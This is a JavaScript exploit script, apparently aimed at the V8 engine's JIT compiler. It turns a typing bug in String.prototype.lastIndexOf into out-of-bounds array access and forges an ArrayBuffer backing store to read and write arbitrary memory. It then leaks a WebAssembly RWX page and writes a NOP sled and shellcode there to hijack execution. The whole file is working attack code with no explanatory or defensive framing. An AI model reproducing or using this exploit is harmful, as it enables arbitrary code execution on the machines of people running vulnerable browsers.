let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
f64[0] = v;
return u32;
}
function u2d(lo, hi) {
u32[0] = lo;
u32[1] = hi;
return f64[0];
}
function hex(lo, hi) {
return ("0x" + hi.toString(16) + lo.toString(16));
}
function view(unboxed, lim) {
for(let i = 0; i < lim; i++) {
t = d2u(unboxed[i]);
console.log("[" + i + "]" + hex(t[0], t[1]));
}
}
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1,
112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105,
0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
const s = "A".repeat(1073741799);
function pwn() {
const offset = 5;
let ii = String.prototype.lastIndexOf.call(s, "");
let x = ii + 25;
x >>= 30;
x *= offset;
let leak = 0;
if(x > 5 && y > 5) {
leak = 0;
}
else {
let arr = new Array(1.1, 2.2);
//let leaked = new Array(1.1, 2.2);
arr2 = new Array(3.3, 4.4);
arr3 = new Array(0x1337, 0x1338);
leak = arr[x];
arr[x] = u2d(0, 0x2000);
if( leak != undefined ) {
ab = new ArrayBuffer(0x45);
// index 303 -> wasm -> "f"
arr4 = new Array(0xdada, 0xaadd, f);
//view(arr, 400);
// index 25 -> ArrayBuffer length
// index 26 -> ArrayBuffer backing store
// view function -> just view memory values via unboxed oob array
wasm_lo = d2u(arr[303])[0];
wasm_hi = d2u(arr[303])[1];
arr[25] = u2d(0x1000, 0x0);
arr[26] = u2d(wasm_lo - 1, wasm_hi);
dv = new DataView(ab);
// leak wasm rwx page via DataView Object
// wasm page is placed in f->SharedFunctionInfo address - 0xc0
lo = dv.getUint32(0x18, true);
hi = dv.getUint32(0x18 + 4, true);
console.log("[-] leak : " + hex(lo, hi));
arr[26] = u2d(lo - 1 - 0xc0, hi);
rwx_lo = dv.getUint32(0, true);
rwx_hi = dv.getUint32(4, true);
console.log("[-] rwx_leak : " + hex(rwx_lo, rwx_hi));
arr[26] = u2d(rwx_lo, rwx_hi);
for(let i = 0; i < 40; i++) {
dv.setUint32(i * 4, 0x90909090, true);
}
for(let i = 0; i < shellcode.length; i++) {
dv.setUint32(i * 4, shellcode[i], true);
}
return true;
}
}
return false;
}